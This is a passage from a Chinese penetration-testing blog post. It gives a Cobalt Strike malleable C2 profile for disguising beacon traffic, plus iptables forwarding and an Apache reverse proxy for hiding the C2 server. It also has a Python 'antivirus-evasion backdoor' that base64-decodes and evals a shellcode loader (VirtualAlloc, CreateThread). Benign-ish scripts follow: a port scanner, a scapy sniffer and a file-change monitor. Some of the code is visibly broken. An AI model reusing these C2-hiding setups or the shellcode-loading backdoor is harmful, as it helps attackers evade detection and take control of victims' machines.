+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">set sample_name &quot;t&quot;;</span><br><span class="line">set sleeptime &quot;3000&quot;;</span><br><span class="line">set jitter &quot;0&quot;;</span><br><span class="line">set maxdns &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;;</span><br><span class="line">http-get &#123;</span><br><span class="line">  set uri &quot;/api/x&quot;;</span><br><span class="line">  client &#123;</span><br><span class="line">    header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">    metadata &#123;</span><br><span class="line">      base64;</span><br><span class="line">      prepend &quot;SESSIONID=&quot;;</span><br><span class="line">      header &quot;Cookie&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  server &#123;</span><br><span class="line">    header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">    header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">    header &quot;Server&quot; &quot;Nodejs&quot;;</span><br><span class="line">    output &#123;</span><br><span class="line">      base64;</span><br><span class="line">      print;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;</span><br><span class="line">  set uri_x86 &quot;/vue.min.js&quot;;</span><br><span class="line">  set uri_x64 &quot;/bootstrap-2.min.js&quot;;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">  set uri &quot;/api/y&quot;;</span><br><span class="line">  client &#123;</span><br><span class="line">    header &quot;Accept&quot; &quot;*/*&quot;;</span><br><span class="line">    id &#123;</span><br><span class="line">       base64;</span><br><span class="line">       prepend &quot;JSESSION=&quot;;</span><br><span class="line">       header &quot;Cookie&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    output &#123; </span><br><span class="line">       base64;</span><br><span class="line">       print;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  server &#123;</span><br><span class="line">    header &quot;Content-Type&quot; &quot;application/ocsp-response&quot;;</span><br><span class="line">    header &quot;content-transfer-encoding&quot; &quot;binary&quot;;</span><br><span class="line">    header &quot;Connection&quot; &quot;keep-alive&quot;;</span><br><span class="line">    output &#123;</span><br><span class="line">      base64;</span><br><span class="line">      print;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>启动 CS 加载 profile：./teamserver IP 密码 xxx.profile</p>
+<p>（ 5 ）端口转发 - Iptables</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">转发机设置转发：(80改 443 即https)</span></span><br><span class="line">iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 47.94.236.117:80</span><br><span class="line">iptables -t nat -A POSTROUTING -j MASQUERADE</span><br><span class="line">iptables -I FORWARD -j ACCEPT</span><br><span class="line">iptables -P FORWARD ACCEPT</span><br><span class="line">sysctl net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>
+<p>CS 监听器配置转发机 IP</p>
+<p>（ 6 ）中间件反向代理 - Apache</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">代理机安装Apache：</span></span><br><span class="line">apt-get install apache2</span><br><span class="line">a2enmod proxy proxy_ajp proxy_balancer proxy_connect proxy_http</span><br><span class="line">systemctl restart apache2</span><br><span class="line">/etc/apache2/sites-enabled/000-default.conf</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">中间件设置转发：</span></span><br><span class="line">http:</span><br><span class="line">ProxyPass &quot;/&quot; &quot;http://CS的IP/&quot;</span><br><span class="line">ProxyPassReverse &quot;/&quot; &quot;http://CS的IP/&quot;</span><br><span class="line"></span><br><span class="line">https:</span><br><span class="line">ProxyPass &quot;/&quot; &quot;https://CS的IP/&quot;</span><br><span class="line">ProxyPassReverse &quot;/&quot; &quot;https://CS的IP/&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启Apache服务：</span></span><br><span class="line">service apache2 restart</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CS监听器配置转发机IP</span></span><br></pre></td></tr></table></figure>
+<h3 id="python自动化"><a class="markdownIt-Anchor" href="#python自动化">#</a> python 自动化</h3>
+<h4 id="socket免杀后门"><a class="markdownIt-Anchor" href="#socket免杀后门">#</a> socket 免杀后门</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">client.py</span></span><br><span class="line">import socket,sys</span><br><span class="line"></span><br><span class="line">ip=sys.argv[1]</span><br><span class="line">port=sys.argv[2]</span><br><span class="line">s1=socket.socket()</span><br><span class="line">s1.connect((ip,int(port)))</span><br><span class="line">while True:</span><br><span class="line">  cmdline=input(&#x27;please input cmdline:&#x27;)</span><br><span class="line">  s1.send(cmdline.encode())</span><br><span class="line">  cmddata=s1.recv(1024).decode()</span><br><span class="line">  print(cmddata)</span><br><span class="line">  s1.close()</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">server.py</span></span><br><span class="line">import socket,os,ctypes,base64</span><br><span class="line"></span><br><span class="line">s=socket.socket()</span><br><span class="line">s.bind((&#x27;0.0.0.0&#x27;,9999))</span><br><span class="line">s.listen(5)</span><br><span class="line">def zx(s):</span><br><span class="line">  sc = base64.b64decode(s)</span><br><span class="line">  code=&#x27;cnd4cGFnZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKDAsIGxlbihzYyksIDB4MTAwMCwgMHg0MCkKY3R5cGVzLndpbmRsbC5r ZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KHJ3eHBhZ2UsIGN0eXBlcy5jcmVhdGVfc3 RyaW5nX2J1ZmZlcihzYyksIGxlbihzYykpCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKDAsIDAsIHJ3eHBhZ2UsIDAsIDAsIDA pCmN0eXBlcy53aW5kbGwua2VybmVsMzIuV2FpdEZvclNpbmdsZU9iamVjdChoYW5kbGUsIC0xKQ==&#x27;</span><br><span class="line">  c=base64.b64decode(code)</span><br><span class="line">  eval(c)</span><br><span class="line">  while 1:</span><br><span class="line">    sock,addr=s.accept()</span><br><span class="line">    print(sock, addr)</span><br><span class="line">  while 1:</span><br><span class="line">    cmd=sock.recv(10241).decode()</span><br><span class="line">    print(cmd)</span><br><span class="line">    print(type(cmd))</span><br><span class="line">    zx(cmd)</span><br><span class="line">    print(cmd_data)</span><br><span class="line">    print(type(cmd_data))</span><br><span class="line">    sock.send(cmd_data.encode())</span><br><span class="line">    sock.close()</span><br></pre></td></tr></table></figure>
+<h4 id="多线程全端口扫描"><a class="markdownIt-Anchor" href="#多线程全端口扫描">#</a> 多线程全端口扫描</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line">import threading</span><br><span class="line">import queue</span><br><span class="line"></span><br><span class="line">def port_scan():</span><br><span class="line">  while not q.empty():</span><br><span class="line">    ip = &#x27;127.0.0.1&#x27;</span><br><span class="line">    port = q.get()</span><br><span class="line">    s = socket.socket()</span><br><span class="line">    if s.connect_ex((ip, port)) == 0:</span><br><span class="line">      print(&quot;%d is open&quot; %port)</span><br><span class="line">    else:</span><br><span class="line">      pass</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  q = queue.Queue()</span><br><span class="line">  for port in range(1,65536):</span><br><span class="line">    q.put(port)</span><br><span class="line">      for i in range(30):</span><br><span class="line">      t = threading.Thread(target=port_scan)</span><br><span class="line">      t.start()</span><br></pre></td></tr></table></figure>
+<h4 id="scapy流量分析"><a class="markdownIt-Anchor" href="#scapy流量分析">#</a> scapy 流量分析</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">def packet_callback(packet):</span><br><span class="line">  print(packet.show())</span><br><span class="line">  data=bytes(packet[TCP].payload)</span><br><span class="line">    for info in data.split(b&#x27;\n&#x27;):</span><br><span class="line">    print(info)</span><br><span class="line">    if b&#x27;Content-Disposition: form-data; name=&quot;&#x27; in info:</span><br><span class="line">      print(&#x27;文件上传攻击中...&#x27;)</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">  sniff(filter=&#x27;host 192.168.1.107 and tcp port 80&#x27;,iface=&#x27;以太网&#x27;,prn=packet_callback,store=0)</span><br></pre></td></tr></table></figure>
+<h4 id="文件行为监控"><a class="markdownIt-Anchor" href="#文件行为监控">#</a> 文件行为监控</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from watchdog.observers import Observer</span><br><span class="line">from watchdog.events import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">class FileEventHandler(FileSystemEventHandler):</span><br><span class="line">  def __init__(self):</span><br><span class="line">    FileSystemEventHandler.__init__(self)</span><br><span class="line"></span><br><span class="line">  def on_moved(self, event):</span><br><span class="line">    if event.is_directory:</span><br><span class="line">      print(&quot;directory moved from &#123;0&#125; to &#123;1&#125;&quot;.format(event.src_path,event.dest_path))</span><br><span class="line">    else:</span><br><span class="line">      print(&quot;file moved from &#123;0&#125; to &#123;1&#125;&quot;.format(event.src_path,event.dest_path))</span><br><span class="line">  </span><br><span class="line">  def on_created(self, event):</span><br><span class="line">    if event.is_directory:</span><br><span class="line">      print(&quot;directory created:&#123;0&#125;&quot;.format(event.src_path))</span><br><span class="line">    else:</span><br><span class="line">      print(&quot;file created:&#123;0&#125;&quot;.format(event.src_path))</span><br><span class="line">  </span><br><span class="line">  def on_deleted(self, event):</span><br><span class="line">    if event.is_directory:</span><br><span class="line">      print(&quot;directory deleted:&#123;0&#125;&quot;.format(event.src_path))</span><br><span class="line">    else:</span><br><span class="line">      print(&quot;file deleted:&#123;0&#125;&quot;.format(event.src_path))</span><br><span class="line">  </span><br><span class="line">  def on_modified(self, event):</span><br><span class="line">    if event.is_directory:</span><br><span class="line">      print(&quot;directory modified:&#123;0&#125;&quot;.format(event.src_path))</span><br><span class="line">    else:</span><br><span class="line">      print(&quot;file modified:&#123;0&#125;&quot;.format(event.src_path))</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">  observer = Observer()</span><br><span class="line">  event_handler = FileEventHandler()</span><br><span class="line">  observer.schedule(event_handler, r&quot;C:\Users\wyq\Desktop\1&quot;, True)</span><br><span class="line">  observer.start()</span><br><span class="line">  try:</span><br><span class="line">    while True:</span><br><span class="line">      time.sleep(1)</span><br><span class="line">  except KeyboardInterrupt:</span><br><span class="line">    observer.stop()</span><br><span class="line">    observer.join()</span><br></pre></td></tr></table></figure>
+
+      <div class="tags">
+          <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="ic i-tag"></i> 渗透测试</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-07-04 22:30:27" itemprop="dateModified" datetime="2023-07-04T22:30:27+08:00">2023-07-04</time>
+  </span>
+  <span id="2022/12/30/SAFE/13 补充知识/" class="item leancloud_visitors" data-flag-title="XD22 13 补充知识" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt=".N1h1l157 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt=".N1h1l157 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt=".N1h1l157 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>.N1h1l157 <i class="ic i-at"><em>@</em></i>X_T
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://n1h1l157.github.io/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" title="XD22 13 补充知识">http://n1h1l157.github.io/2022/12/30/SAFE/13 补充知识/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/12/30/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;js4tJW7km8aqygU.jpg" title="XD22 14 打破常规">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
+  <h3>XD22 14 打破常规</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;lzxCnDdB1eoSati.jpg" title="XD22 12 权限维持">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 信息安全</span>
+  <h3>XD22 12 权限维持</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#vpc%E9%A1%B9%E7%9B%AE"><span class="toc-number">1.</span> <span class="toc-text"> vpc 项目</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#vpc1"><span class="toc-number">1.1.</span> <span class="toc-text"> vpc1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vpc2"><span class="toc-number">1.2.</span> <span class="toc-text"> vpc2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vpc3"><span class="toc-number">1.3.</span> <span class="toc-text"> vpc3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vpc4"><span class="toc-number">1.4.</span> <span class="toc-text"> vpc4</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A2%E9%98%9Fapt"><span class="toc-number">2.</span> <span class="toc-text"> 红队 APT</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC"><span class="toc-number">2.1.</span> <span class="toc-text"> 邮件钓鱼</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%8F%E7%97%85%E6%AF%92"><span class="toc-number">2.2.</span> <span class="toc-text"> 宏病毒</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#chm-%E7%94%B5%E5%AD%90%E4%B9%A6"><span class="toc-number">2.3.</span> <span class="toc-text"> CHM 电子书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#lnk-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F"><span class="toc-number">2.4.</span> <span class="toc-text"> LNK 快捷方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#office-cve%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.5.</span> <span class="toc-text"> Office CVE 漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%93%E9%B1%BC%E4%BC%AA%E8%A3%85"><span class="toc-number">2.6.</span> <span class="toc-text"> 钓鱼伪装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nc-%E6%B5%81%E9%87%8F%E5%8A%A0%E5%AF%86"><span class="toc-number">2.7.</span> <span class="toc-text"> NC 流量加密</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#msf-%E9%80%9A%E8%AE%AF%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9"><span class="toc-number">2.8.</span> <span class="toc-text"> MSF 通讯特征修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cs-%E9%80%9A%E8%AE%AF%E7%89%B9%E5%BE%81%E4%BF%AE%E6%94%B9"><span class="toc-number">2.9.</span> <span class="toc-text"> CS 通讯特征修改</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#c2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%9A%90%E8%97%8F"><span class="toc-number">2.10.</span> <span class="toc-text"> C2 服务器隐藏</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E8%87%AA%E5%8A%A8%E5%8C%96"><span class="toc-number">3.</span> <span class="toc-text"> python 自动化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#socket%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8"><span class="toc-number">3.1.</span> <span class="toc-text"> socket 免杀后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%85%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.</span> <span class="toc-text"> 多线程全端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#scapy%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.3.</span> <span class="toc-text"> scapy 流量分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%A1%8C%E4%B8%BA%E7%9B%91%E6%8E%A7"><span class="toc-number">3.4.</span> <span class="toc-text"> 文件行为监控</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2022/12/30/SAFE/1%20WEB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 1 Web 基础知识">XD22 1 Web 基础知识</a></li><li><a href="/2022/12/30/SAFE/10%20%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/" rel="bookmark" title="XD22 10 免杀对抗">XD22 10 免杀对抗</a></li><li><a href="/2022/12/30/SAFE/11%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="bookmark" title="XD22 11 内网安全">XD22 11 内网安全</a></li><li><a href="/2022/12/30/SAFE/12%20%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="bookmark" title="XD22 12 权限维持">XD22 12 权限维持</a></li><li class="active"><a href="/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/" rel="bookmark" title="XD22 13 补充知识">XD22 13 补充知识</a></li><li><a href="/2022/12/30/SAFE/14%20%E6%89%93%E7%A0%B4%E5%B8%B8%E8%A7%84/" rel="bookmark" title="XD22 14 打破常规">XD22 14 打破常规</a></li><li><a href="/2022/12/30/SAFE/4%20API%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 4 API 攻防">XD22 4 API 攻防</a></li><li><a href="/2022/12/30/SAFE/3%20%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 3 服务攻防">XD22 3 服务攻防</a></li><li><a href="/2022/12/30/SAFE/5%20APP%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 5 APP 攻防">XD22 5 APP 攻防</a></li><li><a href="/2022/12/30/SAFE/6%20%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/" rel="bookmark" title="XD22 6 漏洞发现及利用">XD22 6 漏洞发现及利用</a></li><li><a href="/2022/12/30/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="XD22 2 Web 通用漏洞">XD22 2 Web 通用漏洞</a></li><li><a href="/2022/12/30/SAFE/7%20waf%E6%94%BB%E9%98%B2/" rel="bookmark" title="XD22 7 Waf 攻防">XD22 7 Waf 攻防</a></li><li><a href="/2022/12/30/SAFE/8%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="bookmark" title="XD22 8 代码审计">XD22 8 代码审计</a></li><li><a href="/2022/12/30/SAFE/9%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="bookmark" title="XD22 9 权限提升">XD22 9 权限提升</a></li><li><a href="/2023/05/01/SAFE/Trojan/" rel="bookmark" title="Trojan 生成">Trojan 生成</a></li><li><a href="/2023/05/10/SAFE/Security%20URL/" rel="bookmark" title="信息安全 网址">信息安全 网址</a></li><li><a href="/2023/05/19/SAFE/Linux/" rel="bookmark" title="Linux 命令">Linux 命令</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt=".N1h1l157"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">.N1h1l157</p>
+  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">167</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">5</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">39</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
+      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
+      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
+      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
+      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
+      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>友链</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-clipboard"></i>书架</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/books/LITERATURE/" rel="section"><i class="ic i-fedora"></i>LITERATURE</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/VULNHUB/" rel="section"><i class="ic i-android"></i>X_T-VULNHUB</a>
+  </li>
+
+        
+  <li class="item">
